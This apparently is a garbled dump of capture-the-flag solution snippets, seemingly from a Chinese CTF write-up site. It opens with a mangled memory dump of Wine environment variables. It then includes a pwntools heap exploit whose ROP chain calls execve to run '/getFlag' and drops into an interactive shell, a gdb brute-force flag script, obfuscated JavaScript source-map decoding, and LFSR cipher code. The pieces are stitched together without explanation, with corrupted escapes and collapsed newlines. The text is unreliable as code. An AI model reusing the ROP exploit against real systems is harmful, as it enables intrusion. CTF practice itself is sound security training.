AMD64x00PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 80 Stepping 0, AuthenticAMDx00PROCESSOR_LEVEL=25x00PROCESSOR_REVISION=5000x00APPDATA=C:\users\user\Application Datax00CLIENTNAME=Consolex00HOMEDRIVE=C:
x00HOMEPATH=\users\userx00LOCALAPPDATA=C:\users\user\Local Settings\Application Datax00LOGONSERVER=\\E7DE35656151x00SESSIONNAME=Consolex00USERDOMAIN=E7DE35656151x00USERNAME=userx00USERPROFILE=C:\users\userx00COMPUTERNAME=E7DE35656151x00WINEDATADIR=\??\Z:\usr\lib\wine\..\..\share\wine\winex00WINEHOMEDIR=\??\Z:\home\userx00WINECONFIGDIR=\??\Z:\home\user\.winex00WINEDLLDIR0=\??\Z:\usr\lib\x86_64-linux-gnu\winex00WINEUSERNAME=userx00x00x00x00x00x00x00x00x00x00xb8x03x00x00USEx08 @x01x00x00x00x00x006@x01x00x00x00x00x00J@x01x00x00x00x00x00j@x01x00x00x00x00x00}@x01x00x00x00x00x00x95@x01x00x00x00x00x00xb2@x01x00x00x00x00x00xf9@x01x00x00x00x00x00x0cAx01x00x00x00x00x00$Ax01x00x00x00x00x00KAx01x00x00x00x00x00^Ax01x00x00x00x00x00kAx01x00x00x00x00x00x80Ax01x00x00x00x00x00xbbAx01x00x00x00x00x00xd6Ax01x00x00x00x00x00xeaAx01x00x00x00x00x00x02Bx01x00x00x00x00x00x10Bx01x00x00x00x00x00*Bx01x00x00x00x00x00DBx01x00x00x00x00x00zBx01x00x00x00x00x00x97Bx01x00x00x00x00x00xbcBx01x00x00x00x00x00xedBx01x00x00x00x00x00x00x00x00x00x00x00x00x00HOSTNAME=e7de35656151x00WINEDEBUG=fixme-allx00WINELOADER=/usr/lib/wine/wine64x00WINELOADERNOEXEC=1x00NUMBER_OF_PROCESSORS=16x00PROCESSOR_ARCHITECTURE=AMD64x00PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 80 Stepping 0, AuthenticAMDx00PROCESSOR_LEVEL=25x00PROCESSOR_REVISION=5000x00APPDATA=C:\users\user\Application Datax00CLIENTNAME=Consolex00HOMEDRIVE=C:
x00HOMEPATH=\users\userx00LOCALAPPDATA=C:\users\user\Local Settings\Application Datax00LOGONSERVER=\\E7DE35656151x00SESSIONNAME=Consolex00USERDOMAIN=E7DE35656151x00USERNAME=userx00USERPROFILE=C:\users\userx00COMPUTERNAME=E7DE35656151x00WINEDATADIR=\??\Z:\usr\lib\wine\..\..\share\wine\winex00WINEHOMEDIR=\??\Z:\home\userx00WINECONFIGDIR=\??\Z:\home\user\.winex00WINEDLLDIR0=\??\Z:\usr\lib\x86_64-linux-gnu\winex00WINEUSERNAME=userx00x00x00x00x00x00x00x00x00x00x18x02x00x00USEx10Zx00:
x00\x00bx00ax00bx00yx00-x00hx00ex00ax00px00-x00qx00ux00ex00sx00tx00ix00ox00nx00-x00mx00ax00rx00kx00.x00ex00xx00ex00x00x00=x00fx00ix00xx00mx00ex00-x00ax00lx00lx00x00x00Wx00Ix00Nx00Ex00Lx00Ox00Ax00Dx00Ex00Rx00=x00/x00ux00sx00rx00/x00lx00ix00bx00/x00wx00ix00nx00ex00/x00wx00ix00nx00ex006x004x00x00x00Wx00Ix00Nx00Ex00Lx00Ox00Ax00Dx00Ex00Rx00Nx00Ox00Ex00Xx00Ex00Cx00=x001x00x00x00Nx00Ux00Mx00Bx00Ex00Rx00_x00Ox00Fx00_x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00Sx00=x001x006x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Ax00Rx00Cx00Hx00Ix00Tx00Ex00Cx00Tx00Ux00Rx00Ex00=x00Ax00Mx00Dx006x004x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Ix00Dx00Ex00Nx00Tx00Ix00Fx00Ix00Ex00Rx00=x00Ax00Mx00Dx006x004x00 x00Fx00ax00mx00ix00lx00yx00 x002x005x00 x00Mx00ox00dx00ex00lx00 x008x000x00 x00Sx00tx00ex00px00px00ix00nx00gx00 x000x00,x00 x00Ax00ux00tx00hx00ex00nx00tx00ix00cx00Ax00Mx00Dx00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Lx00Ex00Vx00Ex00Lx00=x002x005x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Rx00Ex00Vx00Ix00Sx00Ix00Ox00Nx00=x005x000x000x000x00x00x00Ax00Px00Px00Dx00Ax00Tx00Ax00=x00hx00x00x00USEx08'SYS_execve = 59
add(3)edit(0, flat({0:
dump_memory, 0xa10:
p64(4) + p64(0x21fad8) + p64(4)}, filler=b'0'))edit(0, flat([    0x00000003af6b3fa9, 0,          # pop rdx; add eax, 0x7e0f6600; ret;    0x00000003af686040, SYS_execve, # pop rax; ret;    0x00000003af686177, 0x21fb20,   # pop rdi; ret;    0x00000003af68655a, 0,          # pop rsi; ret;    0x00000003af67bb76,             # syscall;    b'/getFlag0',                  # execve("/getFlag", NULL, NULL)]))
sh.interactive()
> file checkcheck: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b642c20c8b33d5ad6da327870a4840d6a70407e7, for GNU/Linux 3.2.0, stripped
import sys
PIE_BASE = 0x555555554000
breakpoints = [0xec56] #CMP R12,qword ptr [RAX]
gdb.execute('file check')gdb.execute('set pagination off')
for bp in breakpoints:    gdb.execute(f'b *{PIE_BASE + bp}')
flag = ['_'] * 16index = 0
while True:    if flag[index] != '_':        index = (index + 1) % 16        continue
    counts = []    for ch in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-':        flag[index] = ch
        gdb.execute(f'starti "{"".join(flag)}"')
        count = 0        while True:            try:                gdb.execute('c')            
except:                break            count += 1                sys.stderr.write(f'ATTEMPT FLAG:{"".join(flag)}, COUNT:{count}n')
        counts.append((count, ch))        flag[index] = '_'    if len(set(map(lambda x: x[0], counts))) != 1:        flag[index] = sorted(counts, key=lambda x: x[0], reverse=True)[0][1]        sys.stderr.write(f'CURRENT FLAG: {"".join(flag)}n')        index = (index + 1) % 16
const b64 = AB...=;
export const go = async () => {    const bti = b64.trim().split("n").reduce((acc, x, i) => (acc.set(x, i), acc), new Map());    const upc = window.buffer.shift();    const moi = await fetch(import.meta.url).then((x) => x.text())    const tg = await fetch(moi.slice(moi.lastIndexOf("=") + 1)).then((x) => x.json())    const fl = tg.mappings.split(";").flatMap((v, l) =>v.split(",").filter((x) => !!x).map((input) => input.split("").map((x) => bti.get(x)).reduce((acc, i) => (i & 32 ? [...acc.slice(0, -1), [...acc.slice(-1)[0], (i & 31)]] : [...acc.slice(0, -1), [[...acc.slice(-1)[0], i].reverse().reduce((acc, i) => (acc << 5) + i, 0)]].map((x) => typeof x === "number" ? x : x[0] & 0x1 ? (x[0] >>> 1) === 0 ? -0x80000000 : -(x[0] >>> 1) : (x[0] >>> 1)).concat([[]])), [[]]).slice(0, -1)).map(([c, s, ol, oc, n]) => [l,c,s??0,ol??0,oc??0,n??0]).reduce((acc, e, i) => [...acc, [l, e[1] + (acc[i - 1]?.[1]??0), ...e.slice(2)]], [])).reduce((acc, e, i) => [...acc, [...e.slice(0, 2), ...e.slice(2).map((x, c) => x + (acc[i - 1]?.[c + 2] ?? 0))]], []).map(([l, c, s, ol, oc, n], i, ls) => [tg.sources[s],moi.split("n").slice(l, ls[i+1] ? ls[i+1]?.[0] + 1 : undefined).map((x, ix, nl) => ix === 0 ? l === ls[i+1]?.[0] ? x.slice(c, ls[i+1]?.[1]) : x.slice(c) : ix === nl.length - 1 ? x.slice(0, ls[i+1]?.[1]) : x).join("n").trim()]).filter(([_, x]) => x === upc).map(([x]) => x)?.[0] ?? tg.sources.slice(-2, -1)[0];    import(./${fl}).then((x) => x.go());}//# sourceMappingURL=0.js.map
const fl = (heavily obfuscated code).filter(([_, x]) => x === upc).map(([x]) => x)?.[0] ?? tg.sources.slice(-2, -1)[0];
for (let i = 0; i < 200; i++) {    let moi = await fetch(`./${i}.js`).then((x) => x.text())
    let tg = await fetch(moi.slice(moi.lastIndexOf("=") + 1)).then((x) => x.json())
    let fl = tg.mappings.split(";").flatMap((v, l) =>v.split(",").filter((x) => !!x).map((input) => input.split("").map((x) => bti.get(x)).reduce((acc, i) => (i & 32 ? [...acc.slice(0, -1), [...acc.slice(-1)[0], (i & 31)]] : [...acc.slice(0, -1), [[...acc.slice(-1)[0], i].reverse().reduce((acc, i) => (acc << 5) + i, 0)]].map((x) => typeof x === "number" ? x : x[0] & 0x1 ? (x[0] >>> 1) === 0 ? -0x80000000 : -(x[0] >>> 1) : (x[0] >>> 1)).concat([[]])), [[]]).slice(0, -1)).map(([c, s, ol, oc, n]) => [l,c,s??0,ol??0,oc??0,n??0]).reduce((acc, e, i) => [...acc, [l, e[1] + (acc[i - 1]?.[1]??0), ...e.slice(2)]], [])).reduce((acc, e, i) => [...acc, [...e.slice(0, 2), ...e.slice(2).map((x, c) => x + (acc[i - 1]?.[c + 2] ?? 0))]], []).map(([l, c, s, ol, oc, n], i, ls) => [tg.sources[s],moi.split("n").slice(l, ls[i+1] ? ls[i+1]?.[0] + 1 : undefined).map((x, ix, nl) => ix === 0 ? l === ls[i+1]?.[0] ? x.slice(c, ls[i+1]?.[1]) : x.slice(c) : ix === nl.length - 1 ? x.slice(0, ls[i+1]?.[1]) : x).join("n").trim()])
    if (fl.filter(([x, _]) => x === 'success.js').length > 0) {        console.log(fl)        console.log(i)        console.log(fl.filter(([x, _]) => x === 'success.js'))    }}
background:
url('data:
image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iNTQwIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwSDIwMFY1NDBIMFpNMiA2MlY3OEgxOThWNjJaIi8+PC9zdmc+');
➜  ~ echo "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iNTQwIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwSDIwMFY1NDBIMFpNMiA2MlY3OEgxOThWNjJaIi8+PC9zdmc+" | base64 -d<svg xmlns="http://www.w3.org/2000/svg" width="200" height="540"></svg>%
let tops = ['0px', '20px', '-380px', '-60px', '40px', '-20px', '-180px', '-80px', '-80px', '-80px', '-40px', '-60px', '-20px', '-240px', '-140px', '-100px', '-20px', '-20px', '-120px', '-160px', '-380px', '20px', '-20px', '-160px', '-200px', '-80px', '-60px', '-60px', '60px', '-140px', '-60px', '-240px', '60px', '-80px', '-180px', '-60px', '40px', '-60px', '-240px', '-60px', '-220px', '40px', '-260px', '0px', '-20px', '-60px', '-120px', '60px', '-240px', '40px', '-60px', '-20px', '40px', '-60px', '20px', '40px']
for (let n = 0; n < 14; n++) {    let grandparent = document.children.item(0).children.item(1).children.item(0)    let parent = grandparent.children.item(8 + n)    let details = parent.children.item(6)    let done = false    for (let i = 0; i < 26; i++) {        details.children.item(i).open = false    }    for (let i = 0; i < 27; i++) {        for (let j = 26; j < 52; j++) {            details.children.item(j).open = false        }        for (let j = 26; j < 53; j++) {            for (let k = 52; k < 78; k++) {                details.children.item(k).open = false            }            for (let k = 52; k < 79; k++) {                if (window.getComputedStyle(details.children.item(78).children.item(0)).top == tops[n * 4 + 0] && window.getComputedStyle(details.children.item(79).children.item(0)).top == tops[n * 4 + 1] && window.getComputedStyle(details.children.item(80).children.item(0)).top == tops[n * 4 + 2] && window.getComputedStyle(details.children.item(81).children.item(0)).top == tops[n * 4 + 3]) {                    done = true                    break                }                if (k < 78) {                    details.children.item(k).open = true                }            }            if (done) {                break            }            if (j < 52) {                details.children.item(j).open = true            }        }        if (done) {            break        }        if (i < 26) {            details.children.item(i).open = true        }    }}
static inline void XorShift128(uint64_t* state0, uint64_t* state1) {    uint64_t s1 = *state0;    uint64_t s0 = *state1;    *state0 = s0;    s1 ^= s1 << 23;    s1 ^= s1 >> 17;    s1 ^= s0;    s1 ^= s0 >> 26;    // s1 = (s1 &lt;< 23) ^ (s1 &gt;> 17) ^ s0 ^ (s0 >> 26)    *state1 = s1;  }
bucket_map = {    0: '00',    1: '01',    2: '10',    3: '11'}
bucket_map = {    0: '000', 1: '00', 2: '001',    3: '0', 4: '01', 5: '011',    6: '', 7: '100', 8: '10',    9: '1', 10: '110', 11: '11',    12: '111'}
bucket_map = {    0: '000', 1: '00', 2: '0', 3: '01',    4: '', 5: '10', 6: '1', 7: '11',    8: '111'}
noisy_bucket_map = {    0: '0', 1: '0', 2: '0', 3: '0',    4: '', 5: '', 6: '', 7: '',    8: '111'}
bucket_map = {    0: '', 1: '', 2: '??1',    3: '?', 4: '?1', 5: '?11',    6: '', 7: '1', 8: '1',    9: '1',10: '11', 11: '11',    12: '111'}
host_challenge = await self._read_or_fail(rw, 16)challenge_key = host_challenge[:8] # user controlledencrypted_host_nonce = host_challenge[8:] # user controlledcipher = Cipher(authentication_key, Mode.Authentication)host_mangling_key = cipher.encrypt(challenge_key)response = mangle(host_mangling_key, encrypted_host_nonce)await self._write(rw, response)
sector_nonce = f.read(8)if len(sector_nonce) == 0:    breaksector_key = mangle(disk_key, sector_nonce)sector_cipher = Cipher(sector_key, Mode.Data)data = sector_cipher.decrypt(f.read(8208))await self._write(rw, stream_cipher.encrypt(data))
class Cipher:    def __init__(self, key_bytes: bytes, mode: Mode):        # ...        key = int.from_bytes(key_bytes, "big")        key_1 = (key & 0xffffff0000000000) >> 40        key_2 = (key & 0x000000ffffffffff)        lfsr_seed_1 = ((key_1 & 0xfffff8) << 1) | 8 | (key_1 & 7)        lfsr_seed_2 = ((key_2 & 0xfffffffff8) << 1) | 8 | (key_2 & 7)        self.lfsr_1 = LFSR(25, lfsr_seed_1, 0x19e4001) # replaces lsfr-17        self.lfsr_2 = LFSR(41, lfsr_seed_2, 0xfdc0000001) # replaces lsfr-25    def _get_lfsr_byte(self) -> int:        byte_1 = self.lfsr_1.next_byte()        byte_2 = self.lfsr_2.next_byte()        # ...        result = byte_1 + byte_2 + self.carry        self.carry = (result >> 8) & 1        return result & 0xff
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/5-1681812460.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/9-1681812461.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/3-1681812461.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/4-1681812461.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/2-1681812461.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/8-1681812462.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/9-1681812462.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/3-1681812462.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/3-1681812463.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/6-1681812463.png)